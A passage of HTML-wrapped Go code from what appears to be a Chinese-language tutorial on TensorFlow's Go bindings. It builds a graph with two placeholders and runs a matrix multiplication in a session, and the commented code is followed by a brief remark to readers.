data-line=\"crayon-594b6cd4a4754939363350-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-74\">74</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-2\"><span class=\"crayon-e\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-3\"><span class=\"crayon-e\">import</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"fmt\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">tf</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"github.com/tensorflow/tensorflow/tensorflow/go\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"github.com/tensorflow/tensorflow/tensorflow/go/op\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-8\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-9\"><span class=\"crayon-e\">func </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 这里，我们打算要: 创建图  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-11\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我们要定义两个占位符用于在运行的时候传入  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 第一个占位符 A 将是一个 [2, 2] 的整数张量  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 第二个占位符 x 将是一个 [2, 1] 的整数张量  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-15\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 然后，我们要计算 Y = Ax  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-17\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 创建图的第一个节点： 一个空的节点，位于图的根  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">NewScope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-20\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 定义两个占位符  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-24\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 定义接收A和x作为输入参数的操作节点  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">product</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MatMul</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-27\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 每次我们把一个`Scope`穿给操作符的时候，把操作放在作用域的下面。  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 这样，我们有了一个空的作用域（由NewScope创建）：空的作用域是图的根，因此可以用“/”来表示。  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-30\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 现在，我们让tensorflow按照我们的定义来创建图。  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 把作用域和OP结合起来，创建具体的图。  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-33\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Finalize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nil</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 这里没办法处理这个错误：  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 如果我们错误的定义了图，我们必须手工修改这个定义。  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-38\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 这就跟SQL查询一样：如果查询语句在语法上有问题，我们只能重新写  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">panic</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Error</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-42\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 如果在这里，图在语法上是正确的。  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我们就可以把它放到一个Session里，并执行。  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-45\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sess *</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Session  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-47\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">sess</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">NewSession</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SessionOptions</span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nil</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-49\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">panic</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Error</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-51\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 要使用占位符，我们必须创建一个Tensors，这个Tensors包含要反馈到网络的数值  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">matrix</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">column *</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Tensor</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-54\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// A = [ [1, 2], [-1, -2] ]  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">matrix</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">NewTensor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-e\">int64</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nil</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">panic</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Error</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// x = [ [10], [100] ]  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">column</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">NewTensor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-e\">int64</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nil</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">panic</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Error</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-63\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">results</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Tensor  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-65\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">results</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sess</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">map</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Output</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Tensor</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">matrix</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-67\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">column</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Output</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">product</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nil</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nil</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">panic</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Error</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-70\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">results</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-72\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">fmt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Value</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-v\">int64</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4754939363350-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4754939363350-74\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0105 seconds] -->\r\n<p>代码注释的很详细，希望读者能阅读每一行注释。</p>\n<p>现在，Tensorflow-Python用户期望该代码进行编译并正常工作。我们来看看它是否正确：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4765320713097\" class=\"crayon-syntax crayon-theme-github 